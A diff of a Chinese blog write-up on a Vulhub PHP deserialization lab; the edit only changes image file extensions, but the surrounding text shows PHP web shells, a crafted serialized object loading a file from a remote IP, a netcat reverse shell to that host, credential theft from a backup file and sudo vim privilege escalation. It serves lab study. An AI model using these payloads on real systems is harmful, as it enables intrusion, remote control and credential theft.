@@ -509,10 +509,10 @@ system($_GET[&#39;cmd&#39;]);
 ?&gt;
 </code></pre><pre><code>&gt;&gt;&gt; base64.b64encode(b&#39;O:4:&quot;User&quot;:2:{s:10:&quot;\x00User\x00name&quot;;s:5:&quot;admin&quot;;s:9:&quot;\x00User\x00wel&quot;;O:3:&quot;Log&quot;:1:{s:8:&quot;type_log&quot;;s:27:&quot;http://140.143.122.13/c.txt&quot;;}}&#39;)
 b&#39;Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6ODoidHlwZV9sb2ciO3M6Mjc6Imh0dHA6Ly8xNDAuMTQzLjEyMi4xMy9jLnR4dCI7fX0=&#39;
-</code></pre><p>burp重放<br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/5.png" alt=""></p>
+</code></pre><p>burp重放<br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/5.PNG" alt=""></p>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><pre><code>rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+140.143.122.13+4444+&gt;/tmp/f
-</code></pre><p><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/6.png" alt=""><br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/7.png" alt=""></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>获取到shell后在根目录下发现文件<code>credentials.txt.bak</code>,里面是sk4用户的密码，有了密码就可以通过22端口进行远程连接了<br>提权方法是通过<code>sudo -l</code>查看当前用户可执行和无法执行的命令，发现vim对所有用户都NOPASSWORD，所就尝试<code>sudo vim</code>,进入到命令模式输入<code>!bash</code>,就可以成功提权。<br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/8.png" alt=""><br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/9.png" alt=""></p>
+</code></pre><p><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/6.PNG" alt=""><br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/7.PNG" alt=""></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>获取到shell后在根目录下发现文件<code>credentials.txt.bak</code>,里面是sk4用户的密码，有了密码就可以通过22端口进行远程连接了<br>提权方法是通过<code>sudo -l</code>查看当前用户可执行和无法执行的命令，发现vim对所有用户都NOPASSWORD，所就尝试<code>sudo vim</code>,进入到命令模式输入<code>!bash</code>,就可以成功提权。<br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/8.PNG" alt=""><br><img src="/2019/10/12/vulhub-serial-php-fan-xu-lie-hua-ba-ji-shi-zhan/9.PNG" alt=""></p>
 <h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ul>
 <li>遗忘了一部分php反序列化的内容，又看了些基础的东西回顾了一下<code>https://imysec.cn/2019/03/27/php-xu-lie-hua-yu-fan-xu-lie-hua/</code></li>
 <li>一句话木马的利用，以前用到的最多的是<code>&lt;?php @eval($_POST[&#39;xxx&#39;]);?&gt;</code>,这次用到的<code>&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;</code>可以通过get方式获取到自己想要的信息</li>
